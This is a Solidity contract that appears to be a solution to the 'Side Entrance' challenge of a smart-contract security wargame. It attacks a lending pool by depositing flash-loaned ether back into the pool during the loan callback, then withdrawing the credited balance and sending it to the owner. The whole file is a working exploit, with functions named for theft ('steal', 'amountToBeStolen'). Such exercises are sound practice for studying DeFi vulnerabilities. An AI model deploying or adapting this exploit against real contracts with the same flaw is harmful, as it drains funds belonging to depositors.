// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "contracts/side-entrance/SideEntranceLenderPool.sol";

contract Politician{
    using Address for address payable;
    address owner;
    SideEntranceLenderPool pool;
    uint256 amount;

    constructor(address poolAddress, uint256 amountToBeStolen){
        owner = msg.sender;
        pool = SideEntranceLenderPool(poolAddress);
        amount=amountToBeStolen;
    }

    receive() external payable {}

    function execute() external payable {
        pool.deposit{value:amount}();
    }

    function steal() external {
        pool.flashLoan(amount);
        pool.withdraw();
        payable(owner).transfer(amount);
    }

}